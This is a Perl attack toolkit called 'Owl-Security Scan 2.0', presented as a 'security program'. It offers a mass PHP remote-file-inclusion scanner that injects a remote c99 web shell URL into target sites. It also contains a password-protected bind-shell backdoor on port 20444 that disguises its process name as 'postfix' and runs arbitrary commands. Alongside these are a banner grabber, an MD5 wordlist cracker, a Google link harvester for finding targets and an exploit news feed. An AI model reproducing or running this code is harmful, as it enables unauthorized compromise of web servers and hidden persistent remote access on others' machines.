#!/usr/bin/perl
# Exemple simple security program
# author: C00L3R_ / Cooler_
# www.botecounix.com.br -> Portuguese Site
# license BSD
# contact  tony.unix@yahoo.com.br
#################################
#
#                 MADE IN BRAZIL
#               version in english
##################################---> Modulos
use Tk;
use Term::ANSIColor;
use HTML::LinkExtor;
use LWP::UserAgent;
use IO::Socket::INET;
use Digest::MD5 qw(md5_hex);
use warnings;
#################################---> Login clear screen
my $sis="$^O";
if ($sis eq MSWin32) { $cmd="cls"; } else { $cmd="clear"; }
inicio: print `$cmd`;
#################################---> Banner start
image();
my $valor=<STDIN>; chomp $valor;
if ($valor eq 0) { exit; }
if ($valor eq 1) {
#################################---> Var of  your CMD to exploit php injection
$cm = "http://your.site.com/c99.txt?";
#################################---> take vars
print "what name of file to list  \? \n";
my $lista = <STDIN>; chomp $lista;
print "write 0 to dont use proxy \n";
print "what proxy \? exemple 200.1.2.0:8080 \n";
my $proxy = <STDIN>; chomp $proxy;
#################################---> starts the Agent Stealth
$agent = new LWP::UserAgent;
$agent->agent('Mozilla/5.0 (X11; U; Gentoo Linux amd64; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');
$agent->cookie_jar( {} );
$agent->timeout(10);
################################---> Condition proxy
if($proxy!=0) {
  $agent->env_proxy();
  $agent->proxy("http", "http://$proxy/");
}
################################---> Regex work
open (my $injection, "<$lista.txt")|| die "error to open $lista.txt $!\n";
while (<$injection>) {
if ($_ =~ s/$\=.*/=$cm/mg) {
open(LOG,">>sites.txt"); print LOG "$_"; close(LOG); }
}
  print "links regexed\n";
close $injection;
################################---> starts PHP-injection
print "Start VULN SCAN\n";
open (my $teste, "<sites.txt");
while (<$teste>) {
my $pagina="$_"."$cm";
my $request = HTTP::Request->new('GET',$pagina);
my $result = $agent->request($request);
my $site = $agent->request($request);               # $result->content();
if ($site->is_success) { if($site->content =~ /c99/) {
open (OUT, ">>vuln.txt"); print OUT "$pagina\n"; close(OUT); }}
}
print "Scan-owl finish\nopen vuln.txt for see vulnerables hosts\n"; close($teste);
sleep 3; goto inicio;
}
################################---> Host predict
if ($valor eq 2) {
print "what host do you see information \?\n";
my $pagin=<STDIN>; chomp $pagin;
my $socket = IO::Socket::INET->new(
                                       PeerAddr => "$pagin",
                                       PeerPort => "80",
                                       Timeout => "7",
                                       Proto => "tcp"
  );
die "socket with problens\n" unless $socket;
if ($socket) {
print $socket "GET /index.html HTTP/1.0\r\n\r\n";
while (<$socket>) {
if ($_ =~ /Date:|Server:|squid|system/){
print "$_"; }
}}
my $ip = inet_ntoa(inet_aton($pagin));
print "IP:$ip\n";
close($socket);
sleep 8; goto inicio;
}
##############################---> backdoor
if ($valor eq 3) {
$processo='postfix'; my $pid=fork; exit if $pid; $0="$processo"."\0"x16;
$sis="$^O"; $senha="botecounix";
$canal = IO::Socket::INET->new(LocalPort => 20444,
                                Type      => SOCK_STREAM,
                                Reuse     => 1,
                                Listen    => 10 )   # or SOMAXCONN
    or die "not possible conect 20444 : $@\n";
print "On listening\n";
while ($client = $canal->accept()) {
print $client "what pass ?\n"; chomp($auth=<$client>);
if ($auth eq $senha) {
  print $client "OK\n wellcome to $sis\n"; image();
  print $client "owl_shell:";
  while ($cmd=<$client>) {
   @shell= `$cmd`;
   foreach (@shell) { print $client "$_"; }
   print $client "owl_shell:";
  }
}
}
close($canal);                  
}
#############################---> news milw0rm
if ($valor eq 4) {
  &milworm(); sleep 5; goto inicio;
}
#############################---> MD5 Crack
if ($valor eq 5) {
print "MD5 crack\n";
print "Author: evolution0x55 \n";
print "Wordlist file? ";
chomp($file=<>);

open(FOPEN, $file) or die($file." not found!");

print "\nMD5 Hash? ";
chomp($hash=<>);
print "\n";

foreach (<FOPEN>){
    $line_hash=md5_hex($_);
    if ($line_hash eq $hash){
        print "CRACKED: ".$_;
        exit 0;
        }
    print $_.":".$hash." [FAILED]\n";
}
close(FOPEN);
print "\n\nHash not cracked.";
sleep 10; goto inicio;
}

#################################----> Googler
if ($valor eq 6) {
#################################---> take vars
#unlink resposta.txt;
print "Googler LinkExtor by C00L3R\n";
print "write your string \?\n";
my $string = <STDIN>; chomp $string;
print "if you dont use proxy write 0 \n";
print "what proxy \? exemplo 200.1.2.0:8080 \n";
my $proxy = <STDIN>; chomp $proxy;
#################################---> start constructor Stealth
my $agent = new LWP::UserAgent;
$agent->agent('Mozilla/5.0 (X11; U; Gentoo Linux amd64; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');
$agent->cookie_jar( {} );
#################################---> start Proxy
if($proxy!=0) {
  $agent->env_proxy();
  $agent->proxy("http", "http://$proxy/");
}
#################################---> Loop for Google
print "make search login\n";
for(my $i=10;$i<100;$i+=2) {
my $pa="http://www.google.com.pl/search?q=$string&start=$i";
my $request = HTTP::Request->new('GET',$pa);
my $result = $agent->request($request);
my $resposta = $result->content();
open (OUT, ">>paginas.txt");
print OUT "$resposta\n"; close(OUT);
}
#################################---> Extract Links
eval {
print "extract links\n"; sleep 3;
my $parser = HTML::LinkExtor->new;
$parser->parse_file("paginas.txt");
my @links = $parser->links;
  foreach (@links) {
   print 'Type: ', shift @$_, "\n";
    while (my ($name, $val) = splice(@$_, 0, 2)) {
     print " $name -> $val\n";
       if ($val !~ /videos.*|google.*|groups.*|image.*|www\.google.*|orkut.*|64.*|youtube.*/) {
open (OUT, ">>resposta.txt"); print OUT "$val\n"; close(OUT);
        print "$val\n";
       }
    }
  }
#unlink paginas.txt;
print "Scan Caos Googler finishing the result in resposta.txt\n";
}
}

if ($valor eq 7) {
creditos();
sub creditos {
my $texto="Coded by c00l3r_\nthanks voidpointer,dr4k3,b4rtb0y,_mlk_,r0t3d,edenc,st4t1c\nbotecounix.com.br";
my $aviso1 =  MainWindow->new;
$aviso1->title ("Google_LinkExtor");
janela($aviso1, $texto);
MainLoop;
sub janela {
        my ($window, $header) = @_;
$window->title ("http://botecounix.com.br");        
$window->Label( -relief => 'groove',
                        -text => $header)->pack;
        $window->Button(
            -relief => 'groove',
            -text    => 'Voltar',
            -command => [$window => 'destroy']
        )->pack;
}}

}
################################---> random functions

sub milworm() {
@sploits = (); $version = 1.0; $getit = 'http://milw0rm.com/rss.php';
$agent = new LWP::UserAgent; $request = HTTP::Request->new('GET',$getit);
$result = $agent->request($request); $getit =~ s/.*\///;
@result = $result->content(); open(RES,">","mille.txt");
print RES @result; close(RES); open(RES,"<","mille.txt");
@inhalt = <RES>; close(RES); unlink ("mille.txt");
foreach $shit (@inhalt) { $shit =~ tr/</ /; $shit =~ tr/>/ /;
$shit =~ tr/\// /; $shit =~ s/milw0rm.com//ig;
if ($shit =~ m/title/i) { $shit =~ s/title/ /ig; push(@sploits,"$shit");
} } print @sploits; }

sub image {
print q{
                  Owl-Security Scan 2.0
=======================================================
|| ...    *    .   _  .      *               *        ||
||*  .  *     .   * (_)   *                           ||
||  .      |*  ..   *   ..                            ||
||   .  * \|  * .___.  .. *               *           ||
||*   \/   |/ \/(o,o)     .                      *    ||
||  _\_\   |  / /)  )* _/_ *                          ||
||      \ \| /,--"-"---  ..    *    Coded by C00l3r_  ||
||_-----`  |(,__,__/__/_ .         *                  ||
||       \ ||      ..                 *               ||
||        ||| .            *                          ||
|| *      |||                     *                   ||
||      * |||           *              *              ||
||, -=-~' .-^- _--^----.-.-.-.-^.-.-.-.-.-.-.-.-.-.-  ||
||           `                                        ||
=======================================================
             http://BotecoUnix.com.br
--------------------------------------------------------
0- Quit
1- PHP injection Scan 0.1
2- Httpd type Scan
3- Backdoor
4- Milw0rm News
5- MD5 crack
6- Googler LinkExtor term version 0.2
7- Credits
==================================================================
thanks dr4k3,furadordeSyS,r0t3d,b4rtb0y,_mlk_,voidpointer,st4t1c,C0lt7r
my parents and relatives,my friends thanks for all
------------------------------------------------------------------
}}